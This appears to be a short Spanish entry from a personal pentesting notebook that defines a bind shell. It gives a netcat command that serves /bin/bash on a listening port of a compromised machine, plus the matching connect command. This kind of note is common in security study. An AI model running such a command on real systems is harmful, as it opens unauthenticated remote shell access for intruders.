# Bind shell

***

* Tags: #bash #shells #exploiting #hacking

***

## Definición

> Es una técnica opuesta a la \[\[Reverse shell]], ya que en vez de que la máquina comprometida se conecte a la máquina del atacante, es el atacante el que se conecta a la máquina comprometida. El atacante escucha por un puerto determinado, y la máquina comprometida es la que acepta la conexión en ese puerto. Tratamos de abrir un puerto temporal en la máquina comprometida, ofreciendo una bash para ser ejecutada por el atacante.

***

## Uso

Para exponer el puerto (usualmente el 443), utilizamos el siguiente comando con \[\[NetCat]]:

```bash
nc -lnvp <puerto> -e /bin/bash
```

Una vez expuesto el puerto, el atacante puede utilizar el siguiente comando para conseguir una \[\[Shell]]:

```bash
nc <IP> <puerto>
```
